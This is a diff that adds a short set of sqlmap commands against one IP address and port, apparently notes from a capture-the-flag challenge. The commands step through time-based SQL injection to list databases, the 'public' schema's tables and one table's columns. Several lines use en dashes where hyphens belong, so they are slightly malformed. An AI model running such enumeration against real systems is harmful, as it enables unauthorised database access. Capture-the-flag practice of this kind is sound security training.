@@ -1,0 +1,6 @@
+sqlmap – u 'http://34.159.127.208:32694/user?id=' --random-agent --time-sec=2
+sqlmap – u 'http://34.159.127.208:32694/user?id=' --random-agent --time-sec=2 –dbs
+sqlmap – u 'http://34.159.127.208:32694/user?id=' --random-agent --time-sec=2 –D public --tables
+sqlmap – u 'http://34.159.127.208:32694/user?id=' --random-agent --time-sec=2 –D public –T ctf{23143 –columns
+Powershell:
+sqlmap -u "http://34.159.127.208:32694/user?id=" --random-agent --time-sec=2 -D public -T "ctf{23143" --columns
